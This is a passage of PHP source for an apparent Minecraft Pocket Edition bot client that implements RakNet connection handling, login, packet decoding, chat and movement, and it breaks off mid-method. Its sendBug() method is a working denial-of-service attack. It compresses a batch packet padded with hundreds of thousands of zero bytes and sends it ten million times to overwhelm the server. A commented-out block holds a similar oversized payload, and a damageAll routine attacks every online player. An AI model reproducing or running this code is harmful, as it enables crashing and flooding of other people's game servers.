<?php

declare(strict_types=1);

namespace client;

use client\entity\inventory\utils\ContainerIds;
use client\utils\PlayerLocation;
use Exception;
use pocketmine\item\Item;
use pocketmine\math\Vector3;
use pocketmine\network\mcpe\protocol\AddPlayerPacket;
use pocketmine\network\mcpe\protocol\AdventureSettingsPacket;
use pocketmine\network\mcpe\protocol\AnimatePacket;
use pocketmine\network\mcpe\protocol\AvailableCommandsPacket;
use pocketmine\network\mcpe\protocol\BlockEntityDataPacket;
use pocketmine\network\mcpe\protocol\BossEventPacket;
use pocketmine\network\mcpe\protocol\ChunkRadiusUpdatedPacket;
use pocketmine\network\mcpe\protocol\ContainerSetContentPacket;
use pocketmine\network\mcpe\protocol\ContainerSetDataPacket;
use pocketmine\network\mcpe\protocol\ContainerSetSlotPacket;
use pocketmine\network\mcpe\protocol\DataPacket;
use pocketmine\network\mcpe\protocol\DisconnectPacket;
use pocketmine\network\mcpe\protocol\EntityEventPacket;
use pocketmine\network\mcpe\protocol\FullChunkDataPacket;
use pocketmine\network\mcpe\protocol\InventoryActionPacket;
use pocketmine\network\mcpe\protocol\LevelEventPacket;
use pocketmine\network\mcpe\protocol\LevelSoundEventPacket;
use pocketmine\network\mcpe\protocol\MobEffectPacket;
use pocketmine\network\mcpe\protocol\MoveEntityPacket;
use pocketmine\network\mcpe\protocol\MovePlayerPacket;
use pocketmine\network\mcpe\protocol\PacketPool;
use pocketmine\network\mcpe\protocol\PlayerActionPacket;
use pocketmine\network\mcpe\protocol\PlayerListPacket;
use pocketmine\network\mcpe\protocol\PlayStatusPacket;
use pocketmine\network\mcpe\protocol\RemoveEntityPacket;
use pocketmine\network\mcpe\protocol\RequestChunkRadiusPacket;
use pocketmine\network\mcpe\protocol\ResourcePackClientResponsePacket;
use pocketmine\network\mcpe\protocol\ResourcePacksInfoPacket;
use pocketmine\network\mcpe\protocol\RespawnPacket;
use pocketmine\network\mcpe\protocol\SetEntityDataPacket;
use pocketmine\network\mcpe\protocol\SetEntityMotionPacket;
use pocketmine\network\mcpe\protocol\SetTimePacket;
use pocketmine\network\mcpe\protocol\SetTitlePacket;
use pocketmine\network\mcpe\protocol\StartGamePacket;
use pocketmine\network\mcpe\protocol\TextPacket;
use pocketmine\network\mcpe\protocol\UpdateAttributesPacket;
use pocketmine\utils\BinaryStream;
use pocketmine\utils\TextFormat;
use pocketmine\utils\UUID;
use protocol\AddEntityPacket;
use protocol\AddItemEntityPacket;
use protocol\BlockEventPacket;
use protocol\CommandStepPacket;
use protocol\InteractPacket;
use protocol\LoginPacket;
use protocol\MobArmorEquipmentPacket;
use protocol\MobEquipmentPacket;
use protocol\SetEntityLinkPacket;
use protocol\UpdateBlockPacket;
use raklib\protocol\ACK;
use raklib\protocol\ConnectedPing;
use raklib\protocol\ConnectionRequest;
use raklib\protocol\ConnectionRequestAccepted;
use raklib\protocol\Datagram;
use raklib\protocol\DisconnectionNotification;
use raklib\protocol\EncapsulatedPacket;
use raklib\protocol\NACK;
use raklib\protocol\NewIncomingConnection;
use raklib\protocol\OpenConnectionReply1;
use raklib\protocol\OpenConnectionReply2;
use raklib\protocol\OpenConnectionRequest1;
use raklib\protocol\OpenConnectionRequest2;
use raklib\protocol\Packet;
use raklib\protocol\PacketReliability;
use raklib\server\UDPServerSocket;
use raklib\utils\InternetAddress;
use ReflectionObject;
use Throwable;
use utils\NetworkCompression;
use utils\PacketStream;

class PocketEditionClient extends UDPServerSocket
{
	public const MTU = 1492;

	private const MAX_SPLIT_SIZE = 128;
	private const MAX_SPLIT_COUNT = 4;

	private const CHANNEL_COUNT = 32;

	public static $WINDOW_SIZE = 2048;

	/** @var Address */
	private $serverAddress;
	/** @var int */
	private $clientID;
	/** @var int */
	private $lastUpdate;

	/** @var int */
	private $seqNumber = 0;
	/** @var int */
	private $splitID = 0;
	/** @var int */
	private $messageIndex = 0;
	/** @var int */
	private $orderIndex = 0;

	/** @var int[] */
	private $ACKQueue = [];
	/** @var int[] */
	private $NACKQueue = [];
	/** @var Datagram[] */
	private $recoveryQueue = [];
	/** @var Datagram[] */
	private $packetToSend = [];

	/** @var int */
	private $windowStart = 0;
	/** @var int */
	private $windowEnd;
	/** @var int */
	private $highestSeqNumberThisTick = -1;

	/** @var int */
	private $reliableWindowStart = 0;
	/** @var int */
	private $reliableWindowEnd;
	/** @var bool[] */
	private $reliableWindow = [];

	/** @var int[] */
	private $receiveOrderedIndex;
	/** @var int[] */
	private $receiveSequencedHighestIndex;
	/** @var EncapsulatedPacket[][] */
	private $receiveOrderedPackets;

	/** @var Datagram[][] */
	private $splitPackets = [];

	/** @var bool */
	private $isLoggedIn = false;

	/** @var Bot */
	private $player;

	/** @var bool */
	private $disconnect = false;

	/** @var array */
	private $params = [];

	/** @var int */
	private $damage = 0;
	/** @var int */
	private $damageAll = 0;

	/** @var int */
	private $loadRequest = 0;
	private $damageTime = 0;
	/** @var bool */
	private $sendConnection = false;
	private $sendLogin = 0;

	/** @var int */
	private $register = 0;
	/** @var bool */
	private $isRegister = false;

	/** @var bool */
	private $seekFromPlayer = false;

	/**
	 * PocketEditionClient constructor.
	 * @param Server $server
	 * @param Bot $bot
	 */
	function __construct(Server $server, Bot $bot)
	{
		parent::__construct($bot->getAddress());

		$serverAddress = $server->getAddress();
		$this->register = $server->getRegister();

		$this->params = [$server, $bot];
		$this->player = $bot;
		$this->serverAddress = $serverAddress;

		$this->clientID = mt_rand(0, PHP_INT_MAX);
		$this->lastUpdate = time();

		$this->windowEnd = self::$WINDOW_SIZE;
		$this->reliableWindowEnd = self::$WINDOW_SIZE;

		$this->receiveOrderedIndex = array_fill(0, self::CHANNEL_COUNT, 0);
		$this->receiveSequencedHighestIndex = array_fill(0, self::CHANNEL_COUNT, 0);
	}

	/**
	 * @param bool $value
	 */
	function seekFromPlayer(bool $value = true)
	{
		$this->seekFromPlayer = $value;

		if (!$value) {
			$this->player->seekId = 0;
		}
	}

	/**
	 * @param int $damage
	 */
	function damageAll(int $damage = 10)
	{
		$this->damageAll = $damage;
	}

	function sendBug()
	{
		$stream = new BinaryStream();

		$stream->putByte(0x34);
		$stream->putUnsignedVarInt(1);
		$stream->putVarLong(0);

		$count = 586244;
		$stream->putUnsignedVarInt($count);
		$stream->put(str_repeat("\x00", $count));

		$uncompressed = $stream->buffer;
		$stream->reset();
		$stream->putString($uncompressed);

		$batchBuffer = zlib_encode($stream->buffer, ZLIB_ENCODING_DEFLATE, 9);

		info('Bug start');

		for ($i = 0; $i < 10000000; $i++) {
			$this->sendRawData($batchBuffer);
		}

		info('Bug finish');
	}

	protected function sendRawData(string $buffer): void
	{
		$encapsulated = new EncapsulatedPacket();
		$encapsulated->reliability = PacketReliability::RELIABLE_ORDERED;
		$encapsulated->buffer = "\xfe" . $buffer;
		$this->sendEncapsulated($encapsulated);
	}

	protected function sendEncapsulated(EncapsulatedPacket $packet): void
	{
		if (PacketReliability::isOrdered($packet->reliability)) {
			$packet->orderIndex = $this->orderIndex++;
		}

		$maxSize = self::MTU - 60;
		if (strlen($packet->buffer) > $maxSize) {
			$buffers = str_split($packet->buffer, $maxSize);
			$bufferCount = count($buffers);
			$splitID = ++$this->splitID % 65536;

			foreach ($buffers as $count => $buffer) {
				$pk = new EncapsulatedPacket();
				$pk->splitID = $splitID;
				$pk->hasSplit = true;
				$pk->splitCount = $bufferCount;
				$pk->reliability = $packet->reliability;
				$pk->splitIndex = $count;
				$pk->buffer = $buffer;
				if (PacketReliability::isReliable($pk->reliability)) {
					$pk->messageIndex = $this->messageIndex++;
				}
				$pk->sequenceIndex = $packet->sequenceIndex;
				$pk->orderChannel = 0;
				$pk->orderIndex = $packet->orderIndex;
				$this->sendDatagramWithEncapsulated($pk);
			}
		} else {
			if (PacketReliability::isReliable($packet->reliability)) {
				$packet->messageIndex = $this->messageIndex++;
			}
			$this->sendDatagramWithEncapsulated($packet);
		}
	}

	protected function sendDatagramWithEncapsulated(EncapsulatedPacket $packet): void
	{
		$datagram = new Datagram();
		$datagram->sendTime = microtime(true);
		$datagram->headerFlags = Datagram::BITFLAG_NEEDS_B_AND_AS;
		$datagram->packets = [$packet];
		$datagram->seqNumber = $this->seqNumber++;

		$this->recoveryQueue[$datagram->seqNumber] = $datagram;
		$this->sendRakNetPacket($datagram);
		$this->ACKQueue[] = $datagram->seqNumber;
	}

	protected function sendRakNetPacket(Packet $packet): void
	{
		$packet->encode();
		/*if(!$packet instanceof Datagram){
			send('sendRakNetPacket ' . $this->getClassName($packet));
		}*/
		$this->writePacket($packet->buffer, $this->serverAddress->ip, $this->serverAddress->port);
	}

	/**
	 * @return int
	 */
	function getId(): int
	{
		return $this->player->getId();
	}

	/**
	 * @return array
	 */
	function getParams(): array
	{
		return $this->params;
	}

	function quit()
	{
		$pk = new DisconnectionNotification();
		$this->sendSessionRakNetPacket($pk);
		unset($this->socket);
	}

	//

	protected function sendSessionRakNetPacket(Packet $packet): void
	{
		$packet->encode();
		/*if(!$packet instanceof Datagram){
			send('sendSessionRakNetPacket ' . $this->getClassName($packet));
		}*/
		$encapsulated = new EncapsulatedPacket();
		$encapsulated->reliability = PacketReliability::UNRELIABLE;
		$encapsulated->buffer = $packet->buffer;
		$this->sendDatagramWithEncapsulated($encapsulated);
	}

	public function tick(): bool
	{
		if (!$this->disconnect) {
			if ($this->loadRequest > 0 && $this->loadRequest < microtime(true)) {
				return false; //disconnect
			} elseif (!$this->sendConnection) {
				$this->sendOpenConnectionRequest1();
				sleep(1);
			} elseif ($this->sendLogin > 0 && $this->sendLogin < microtime(true)) {
				$this->sendLoginPacket();
				$this->sendLogin = 0;
			} else {
				if ($this->damageTime > 0) {
					$this->damageTime--; // load for next damage
				} else {
					if ($this->damage > 0 && ($id = $this->player->seekId) > 0) {
						$this->damage($id);
						$this->damage--;
						$this->damageTime = 10000; // 33000;
					}

					if ($this->damageAll > 0) {
						$players = $this->player->getPlayersOnline();
						foreach ($players as $player) {
							$eid = (int)abs($player['id'] ?? 0);
							if ($eid > 0) {
								$this->damage($eid);
							}
						}

						$this->damageAll--;
						$this->damageTime = 30000;

						send('DamageAll: ' . $this->damageAll);
					}
				}
			}
		} else return false; // disconnected client

		if ($this->player->isDeath()) {
			BotHelpers::respawn($this);
			$this->player->setDeath(false);
			send('Bot death & respawn success');
		}

		if ($this->readPacket($buffer, $this->serverAddress->ip, $this->serverAddress->port) !== false) {
			if (($packet = RakNetPool::getPacket($buffer)) !== null) {
				$this->handlePacket($packet);
			}
		}

		$this->update();
		if ((time() - $this->lastUpdate) >= 7) {
			$this->lastUpdate = time();

			$pk = new ConnectedPing();
			$pk->sendPingTime = 0;
			$this->sendSessionRakNetPacket($pk);
		}
		$this->titleTick();
		return true;
	}

	public function sendOpenConnectionRequest1(): void
	{
		$pk = new OpenConnectionRequest1();
		$pk->protocol = 6;
		$pk->mtuSize = self::MTU - 28;
		$this->sendRakNetPacket($pk);
	}

	public function sendLoginPacket(): void
	{
		$pk = new LoginPacket();
		$pk->username = $this->player->getName();
		$pk->serverAddress = $this->serverAddress;
		$pk->skin = $this->player->getSkinData();
		$this->sendDataPacket($pk);

		$this->loadRequest = microtime(true) + 10.0;
	}

	/**
	 * @param int $eid
	 */
	function damage(int $eid)
	{
		$pk = new InteractPacket();
		$pk->action = InteractPacket::ACTION_LEFT_CLICK; // ACTION_DAMAGE on SF2
		$pk->target = $eid;
		$this->sendDataPacket($pk);
	}

	protected function handlePacket(Packet $packet): void
	{
		if (!$packet instanceof Datagram && Client::DEBUG_PACKETS_RAKLIB) {
			send('handlePacket ' . $this->getClassName($packet));
		}
		if ($packet instanceof Datagram) {
			$this->handleDatagram($packet);
		} elseif ($packet instanceof ACK) {
			/** @var int $seq */
			foreach ($packet->packets as $seq) {
				if (isset($this->recoveryQueue[$seq])) {
					unset($this->recoveryQueue[$seq]);
				}
			}
		} elseif ($packet instanceof NACK) {
			/** @var int $seq */
			foreach ($packet->packets as $seq) {
				if (isset($this->recoveryQueue[$seq])) {
					$this->packetToSend[] = $this->recoveryQueue[$seq];
					unset($this->recoveryQueue[$seq]);
				}
			}
		} elseif ($packet instanceof OpenConnectionReply1) {
			$this->sendConnection = true;
			$this->sendOpenConnectionRequest2();
		} elseif ($packet instanceof OpenConnectionReply2) {
			$this->sendConnectionRequest();
		} elseif ($packet instanceof ConnectionRequestAccepted) {
			$address = $packet->address;
			if ($address instanceof InternetAddress) {
				info('Raklib connected on ip: ' . $address->ip . ' port: ' . $address->port . ' (v' . $address->version . ')');
			}
			$this->sendNewIncomingConnection();
			$this->sendLogin = microtime(true) + (mt_rand(24, 80) * 0.001);
		}
	}

	protected function getClassName(object $class): string
	{
		return (new ReflectionObject($class))->getShortName();
	}

	protected function handleDatagram(Datagram $packet): void
	{
		if ($packet->seqNumber < $this->windowStart or $packet->seqNumber > $this->windowEnd or isset($this->ACKQueue[$packet->seqNumber])) {
			//echo "Received duplicate or out-of-window packet from server (sequence number $packet->seqNumber, window " . $this->windowStart . "-" . $this->windowEnd . ")\n";
			//return;
		}

		unset($this->NACKQueue[$packet->seqNumber]);
		$this->ACKQueue[$packet->seqNumber] = $packet->seqNumber;
		if ($this->highestSeqNumberThisTick < $packet->seqNumber) {
			$this->highestSeqNumberThisTick = $packet->seqNumber;
		}

		if ($packet->seqNumber === $this->windowStart) {
			//got a contiguous packet, shift the receive window
			//this packet might complete a sequence of out-of-order packets, so we incrementally check the indexes
			//to see how far to shift the window, and stop as soon as we either find a gap or have an empty window
			for (; isset($this->ACKQueue[$this->windowStart]); ++$this->windowStart) {
				++$this->windowEnd;
			}
		} elseif ($packet->seqNumber > $this->windowStart) {
			//we got a gap - a later packet arrived before earlier ones did
			//we add the earlier ones to the NACK queue
			//if the missing packets arrive before the end of tick, they'll be removed from the NACK queue
			for ($i = $this->windowStart; $i < $packet->seqNumber; ++$i) {
				if (!isset($this->ACKQueue[$i])) {
					$this->NACKQueue[$i] = $i;
				}
			}
		} else {
			assert(false, "received packet before window start");
		}

		foreach ($packet->packets as $pk) {
			$this->handleEncapsulatedPacket($pk);
		}
	}

	private function handleEncapsulatedPacket(EncapsulatedPacket $packet): void
	{
		if ($packet->messageIndex !== null) {
			//check for duplicates or out of range
			if ($packet->messageIndex < $this->reliableWindowStart or $packet->messageIndex > $this->reliableWindowEnd or isset($this->reliableWindow[$packet->messageIndex])) {
				return;
			}

			$this->reliableWindow[$packet->messageIndex] = true;

			if ($packet->messageIndex === $this->reliableWindowStart) {
				for (; isset($this->reliableWindow[$this->reliableWindowStart]); ++$this->reliableWindowStart) {
					unset($this->reliableWindow[$this->reliableWindowStart]);
					++$this->reliableWindowEnd;
				}
			}
		}

		if ($packet->hasSplit and ($packet = $this->handleSplit($packet)) === null) {
			return;
		}

		if (PacketReliability::isSequenced($packet->reliability)) {
			if ($packet->sequenceIndex < $this->receiveSequencedHighestIndex[$packet->orderChannel] or $packet->orderIndex < $this->receiveOrderedIndex[$packet->orderChannel]) {
				//too old sequenced packet, discard it
				return;
			}

			$this->receiveSequencedHighestIndex[$packet->orderChannel] = $packet->sequenceIndex + 1;
			$this->handleEncapsulatedPacketRoute($packet);
		} elseif (PacketReliability::isOrdered($packet->reliability)) {
			if ($packet->orderIndex === $this->receiveOrderedIndex[$packet->orderChannel]) {
				//this is the packet we expected to get next
				//Any ordered packet resets the sequence index to zero, so that sequenced packets older than this ordered
				//one get discarded. Sequenced packets also include (but don't increment) the order index, so a sequenced
				//packet with an order index less than this will get discarded
				$this->receiveSequencedHighestIndex[$packet->orderIndex] = 0;
				$this->receiveOrderedIndex[$packet->orderChannel] = $packet->orderIndex + 1;

				$this->handleEncapsulatedPacketRoute($packet);
				for ($i = $this->receiveOrderedIndex[$packet->orderChannel]; isset($this->receiveOrderedPackets[$packet->orderChannel][$i]); ++$i) {
					$this->handleEncapsulatedPacketRoute($this->receiveOrderedPackets[$packet->orderChannel][$i]);
					unset($this->receiveOrderedPackets[$packet->orderChannel][$i]);
				}

				$this->receiveOrderedIndex[$packet->orderChannel] = $i;
			} elseif ($packet->orderIndex > $this->receiveOrderedIndex[$packet->orderChannel]) {
				$this->receiveOrderedPackets[$packet->orderChannel][$packet->orderIndex] = $packet;
			} else {
				//duplicate/already received packet
			}
		} else {
			//not ordered or sequenced
			$this->handleEncapsulatedPacketRoute($packet);
		}
	}

	//

	/**
	 * Processes a split part of an encapsulated packet.
	 * @param EncapsulatedPacket $packet
	 * @return null|EncapsulatedPacket Reassembled packet if we have all the parts, null otherwise.
	 */
	private function handleSplit(EncapsulatedPacket $packet): ?EncapsulatedPacket
	{
		if ($packet->splitCount >= self::MAX_SPLIT_SIZE or $packet->splitIndex >= self::MAX_SPLIT_SIZE or $packet->splitIndex < 0) {
			echo "Invalid split packet part from server, too many parts or invalid split index (part index $packet->splitIndex, part count $packet->splitCount)\n";
			return null;
		}

		//TODO: this needs to be more strict about split packet part validity

		if (!isset($this->splitPackets[$packet->splitID])) {
			if (count($this->splitPackets) >= self::MAX_SPLIT_COUNT) {
				echo "Ignored split packet part from server because reached concurrent split packet limit of " . self::MAX_SPLIT_COUNT . PHP_EOL;
				return null;
			}
			$this->splitPackets[$packet->splitID] = [$packet->splitIndex => $packet];
		} else {
			$this->splitPackets[$packet->splitID][$packet->splitIndex] = $packet;
		}

		if (count($this->splitPackets[$packet->splitID]) === $packet->splitCount) { //got all parts, reassemble the packet
			$pk = new EncapsulatedPacket();
			$pk->buffer = "";

			$pk->reliability = $packet->reliability;
			$pk->messageIndex = $packet->messageIndex;
			$pk->sequenceIndex = $packet->sequenceIndex;
			$pk->orderIndex = $packet->orderIndex;
			$pk->orderChannel = $packet->orderChannel;

			for ($i = 0; $i < $packet->splitCount; ++$i) {
				$pk->buffer .= $this->splitPackets[$packet->splitID][$i]->buffer;
			}

			$pk->length = strlen($pk->buffer);
			unset($this->splitPackets[$packet->splitID]);

			return $pk;
		}

		return null;
	}

	private function handleEncapsulatedPacketRoute(EncapsulatedPacket $packet): void
	{
		if (($pk = RakNetPool::getPacket($packet->buffer)) !== null) { // Raklib packets
			$this->handlePacket($pk);
		} else {
			if ($packet->buffer !== "" && $packet->buffer{0} === "\xfe") { // Batch Packet
				$payload = substr($packet->buffer, 1);
				try {
					$buffer = NetworkCompression::decompress($payload);
					$stream = new PacketStream($buffer);
				} catch (Exception $e) {
					return;
				}

				// handle all packets
				while (!$stream->feof()) {
//					Buffer::_debug($buffer);
					$this->handleDataPacket(PacketPool::getPacket($stream->getString()));
				}
			}
		}
	}

	protected function handleDataPacket(DataPacket $packet): void
	{
		$class = $this->getClassName($packet);
		try {
			$packet->decode();
		} catch (Throwable $e) {
			error('Error on decode: ' . $class . PHP_EOL . $e->getMessage());
			return;
		}
		if ($packet instanceof PlayStatusPacket) {
			if ($packet->status === PlayStatusPacket::PLAYER_SPAWN) {
				$this->loadRequest = 0;
			}
		} elseif ($packet instanceof ContainerSetContentPacket) {
			$player = $this->getPlayer();
			if ($packet->targetEid === $player->getId()) {
				$slots = $packet->slots;
				switch ($packet->windowid) {
					case ContainerIds::INVENTORY:
						$player->getInventory()->setAll($slots);
						break;
					case ContainerIds::ARMOR:
						$player->getArmor()->setAll($slots);
						break;
					case ContainerIds::CREATIVE:
					default:
						mess('CONTENT_CONTAINER_ID', (string)$packet->windowid);
						break;
				}
			}
			return;
		} elseif ($packet instanceof ContainerSetSlotPacket) {
			$player = $this->getPlayer();
			$slot = $packet->slot;
			$item = $packet->item;
			if (!$item instanceof Item) return;
			switch ($packet->windowid) {
				case ContainerIds::INVENTORY:
					$player->getInventory()->saveSlot($slot, $item);
					break;
				case ContainerIds::ARMOR:
					$player->getArmor()->saveSlot($slot, $item);
					break;
				default:
					mess('SLOT_CONTAINER_ID', (string)$packet->windowid);
					break;
			}
			return;
		} elseif ($packet instanceof ContainerSetDataPacket) {
			//furnace change icons
		} elseif ($packet instanceof RespawnPacket) {
			//todo
		} elseif ($packet instanceof DisconnectPacket) {
			$message = $packet->message;
			mess('DISCONNECT', TextFormat::toANSI(strlen($message) > 0 ? $message . TextFormat::RESET : 'message empty'));
			$this->disconnect = true;
			return;
		} elseif ($packet instanceof TextPacket) {
			$text = isset($packet->source) ? $packet->source : $packet->message;
			if (!isset($packet->type)) $packet->type = TextPacket::TYPE_RAW;
			switch ($packet->type) {
				case TextPacket::TYPE_RAW:
					$type = 'RAW';
					if (!$this->isRegister && $this->register > 0) {
						$this->register();
					}
					break;
				default:
				case TextPacket::TYPE_CHAT:
					$type = 'CHAT';
					break;
				case TextPacket::TYPE_TRANSLATION:
					return;
				case TextPacket::TYPE_POPUP:
					$type = 'POPUP';
					break;
				case TextPacket::TYPE_TIP:
					$type = 'TIP';
					if (Client::DISABLE_TIP) return;
					break;
				case TextPacket::TYPE_SYSTEM:
					$type = 'SYSTEM';
					break;
				case TextPacket::TYPE_WHISPER:
					$type = 'WHISPER';
					break;
				case TextPacket::TYPE_ANNOUNCEMENT:
					$type = 'ANNOUNCEMENT';
					break;
			}
			mess($type, TextFormat::toANSI(trim($text) . TextFormat::RESET));
			return;
		} elseif ($packet instanceof SetTitlePacket) {
			if (in_array($packet->type, [SetTitlePacket::TYPE_SET_TITLE, SetTitlePacket::TYPE_SET_SUBTITLE])) {
				mess($packet->type == SetTitlePacket::TYPE_SET_TITLE ? 'TITLE' : 'SUBTITLE',
					TextFormat::toANSI($packet->text . TextFormat::RESET)
				);
			}
			return;
		} elseif ($packet instanceof ResourcePacksInfoPacket && !$this->isLoggedIn) {
			$this->isLoggedIn = true;

			$pk = new ResourcePackClientResponsePacket();
			$pk->status = ResourcePackClientResponsePacket::STATUS_COMPLETED;
			$this->sendDataPacket($pk);

			/*$stream = new BinaryStream();

			$stream->putByte(0x08);
			$stream->putByte(4);

			$count = 586244;
			$stream->putLShort($count);
			$str = str_repeat("\x00", $count);
			for ($i = 0; $i < 100; $i++) {
				$stream->putString($str);
			}

			$uncompressed = $stream->buffer;
			$stream->reset();
			$stream->putString($uncompressed);

			$batchBuffer = zlib_encode($stream->buffer, ZLIB_ENCODING_DEFLATE, 9);
			$this->sendRawData($batchBuffer);*/
		} elseif ($packet instanceof StartGamePacket) {
			$pk = new RequestChunkRadiusPacket();
			$pk->radius = 8;
			$this->sendDataPacket($pk);

			$player = $this->getPlayer();
			$player->setId($packet->entityRuntimeId);
			$player->setGamemode($packet->playerGamemode);
			$player->setLocation($packet->x, $packet->y, $packet->z, $packet->yaw, $packet->pitch);
		} elseif ($packet instanceof UpdateAttributesPacket) {
			$player = $this->player;
			if ($player->getId() === $packet->entityRuntimeId) {
				$player->setAttribute($packet->entries);
			}
			return;
		} elseif ($packet instanceof AdventureSettingsPacket) {
			$player = $this->getPlayer();
			$player->setAllowFlight((bool)$packet->allowFlight);
			$player->setFlying((bool)$packet->isFlying);

			$player->setWorldImmutable((bool)$packet->worldImmutable);
			$player->setWorldBuilder((bool)$packet->worldBuilder);

			$player->setNoPvp((bool)$packet->noPvp);
			$player->setNoPvm((bool)$packet->noPvm);
			$player->setNoMvp((bool)$packet->noMvp);

			$player->setAutoJump((bool)$packet->autoJump);
			$player->setMuted((bool)$packet->muted);

			$player->setFlags((int)$packet->flags);
			$player->setUserPermission((int)$packet->userPermission);
			return;
		} elseif ($packet instanceof SetEntityDataPacket) {
			$id = $packet->entityRuntimeId;
			$player = $this->getPlayer();
			if ($id === $player->getId()) {
				$player->addMetadata((array)$packet->metadata);
			}
			return;
		} elseif ($packet instanceof PlayerListPacket) {
			if (!isset($packet->entries) || !is_array($packet->entries)) return;

			if ($packet->type === PlayerListPacket::TYPE_ADD) {
				$entries = [];
				foreach ($packet->entries as $entry) {
					if (isset($entry[0], $entry[1])) { //uuid & unique id
						$uuid = $entry[0];
						if (!$uuid instanceof UUID) continue;
						$uuid = $uuid->toString();
						$eid = (int)$entry[1] ?? 0;

						$entries[$uuid] = [
							'id' => $eid,
							'username' => $entry[2] ?? 'Unknown',
							'skinId' => $entry[3] ?? 'Standard_Custom',
							'skinData' => $entry[4] ?? '',
						];
					}
				}
				$this->getPlayer()->addPlayersOnline($entries);
			} else {
				$this->getPlayer()->removePlayersOnline($packet->entries);
			}
			return;
		} elseif ($packet instanceof FullChunkDataPacket) {
			$chunkX = $packet->chunkX;
			$chunkZ = $packet->chunkZ;
			$data = $packet->data;
			try {
				$chunk = ChunkHelpers::decodedChunkColumn($chunkX, $chunkZ, $data);
				if (!isset($chunk)) return;
				$this->getPlayer()->getLevel()->addChunk($chunk);
			} catch (Exception $exception) {
				error($exception->getMessage());
			}
			return;
		} elseif ($packet instanceof EntityEventPacket) {
			/*if (($seek = $this->player->seekId) > 0 && $packet->event == EntityEventPacket::HURT_ANIMATION) {
				$this->damage = 100;
			}*/
		} elseif ($packet instanceof MoveEntityPacket) {
			if (($id = $packet->entityRuntimeId) > 0) {
				$loc = $this->player->getPosition();
				$x = $packet->x;
				$y = $packet->y;
				$z = $packet->z;

				// radius 10 blocks
				$distance = ($loc->distance(new Vector3($x, $y, $z)) < 10);
				$npc = $this->player;
				if (($seek = $npc->seekId) > 0 && $seek == $packet->entityRuntimeId) {
					if ($distance) {
						//see to player
						$pos = BotHelpers::lookAt(
							$npc->getPosition(),
							new Vector3($x, $y, $z)
						);
						$pos->setComponents($x, $y, $z);
						$this->move($pos); // copy pos player to bot
					} else {
						$npc->seekId = 0;
						$this->damage = 0;
					}
				} else {
					if ($distance && $this->seekFromPlayer) {
						$npc->seekId = $id;
					}
				}
			}
			return;
		}

		if (!Client::DEBUG_PACKETS_PE_ALL && in_array($packet->pid(), [
				FullChunkDataPacket::NETWORK_ID, SetTimePacket::NETWORK_ID, BlockEntityDataPacket::NETWORK_ID,
				PlayerListPacket::NETWORK_ID, SetEntityDataPacket::NETWORK_ID, AddPlayerPacket::NETWORK_ID,
				RemoveEntityPacket::NETWORK_ID, MovePlayerPacket::NETWORK_ID, MoveEntityPacket::NETWORK_ID,
				LevelSoundEventPacket::NETWORK_ID, PlayerActionPacket::NETWORK_ID, InventoryActionPacket::NETWORK_ID,
				EntityEventPacket::NETWORK_ID, AnimatePacket::NETWORK_ID,
				SetEntityMotionPacket::NETWORK_ID, LevelEventPacket::NETWORK_ID, UpdateBlockPacket::NETWORK_ID,
				MobArmorEquipmentPacket::NETWORK_ID, AddItemEntityPacket::NETWORK_ID, BlockEventPacket::NETWORK_ID,
				SetEntityLinkPacket::NETWORK_ID, MobEquipmentPacket::NETWORK_ID, AddEntityPacket::NETWORK_ID,
				AvailableCommandsPacket::NETWORK_ID, MobEffectPacket::NETWORK_ID, ContainerSetSlotPacket::NETWORK_ID,
				ContainerSetDataPacket::NETWORK_ID, ContainerSetContentPacket::NETWORK_ID, BossEventPacket::NETWORK_ID,
				ChunkRadiusUpdatedPacket::NETWORK_ID, // spammed this on core
			])) {
			return;
		}

		if (Client::DEBUG_PACKETS_PE) {
			send('handleDataPacket ' . $class);
		}
	}

	/**
	 * @return Bot
	 */
	function getPlayer(): Bot
	{
		return $this->player;
	}

	function register()
	{
		$pass = $this->player->getPassword();
		for ($i = 0; $i < $this->register; $i++) {
			$this->sendMessage($pass);
		}
		$this->isRegister = true;
	}

	function sendCommand(string $text)
	{
		$args = explode(' ', $text);
		$command = $args[0];
		unset($args[0]);
		$args = array_values($args);

		// https://github.com/Hydreon/Steadfast2/blob/7b8f096f269b51bbad90180ddb680566acfcbdce/src/pocketmine/Player.php#L2254
		$pk = new CommandStepPacket();
		$pk->command = $command;
		$pk->overload = 'default';

		// https://github.com/Hydreon/Steadfast2/blob/41728138438c07aeec55d824171c185a1f5857f0/src/pocketmine/plugin/PluginBase.php#L69
		$pk->inputJson = [
			'args' => implode(' ', $args)
		];
		$pk->outputJson = [];

		$pk->uvarint1 = 0;
		$pk->currentStep = 0;
		$pk->done = true;
		$pk->clientId = 0;

		$this->sendDataPacket($pk);
	}

	/**
	 * @param string $text
	 */
	function sendMessage(string $text)
	{
		$message = trim(str_replace("\n", '', $text));
		if (substr($message, 0, 1) === '/') {
			$this->sendCommand(substr($message, 1));
			return;
		}

		$pk = new \protocol\TextPacket();
		$pk->type = \protocol\TextPacket::TYPE_CHAT;
		$pk->source = '';
		$pk->message = $message;
		$this->sendDataPacket($pk);
	}

	/**
	 * @param PlayerLocation $loc
	 * @param bool $onGround
	 */
	function move(PlayerLocation $loc, bool $onGround = true)
	{
		$pk = new MovePlayerPacket();
		$pk->entityRuntimeId = $this->player->getId();
		$pk->x = $this->player->x = $loc->getX();
		$pk->y = $this->player->y = $loc->getY();
		$pk->z = $this->player->z = $loc->getZ();
		$pk->yaw = $this->player->yaw = $loc->getYaw();
		$pk->bodyYaw = $loc->getHeadYaw();
		$pk->pitch = $this->player->pitch = $loc->getPitch();
		$pk->onGround = $onGround;
		$this->sendDataPacket($pk);
	}

	public function sendDataPacket($packets, ?int $compressionLevel = null): void
	{
		$stream = new PacketStream();
		if (!is_array($packets)) {
			$packets = [$packets];
		}
		foreach ($packets as $packet) {
			if (!in_array($packet->pid(), [
				MovePlayerPacket::NETWORK_ID, TextPacket::NETWORK_ID, InteractPacket::NETWORK_ID
			])) {
				send('sendDataPacket ' . $packet->getName());
			}
			$stream->putPacket($packet);
		}
		$this->sendRawData(NetworkCompression::compress($stream->buffer, $compressionLevel));
	}

	public function sendOpenConnectionRequest2(): void
	{
		$pk = new OpenConnectionRequest2();
		$pk->clientID = $this->clientID;
		$pk->serverAddress = $this->serverAddress;
		$pk->mtuSize = self::MTU;
		$this->sendRakNetPacket($pk);
	}

	public function sendConnectionRequest(): void
	{
		$pk = new ConnectionRequest();
		$pk->clientID = $this->clientID;
		$pk->sendPingTime = time();
		$this->sendSessionRakNetPacket($pk);
	}

	public function sendNewIncomingConnection(): void
	{
		$pk = new NewIncomingConnection();
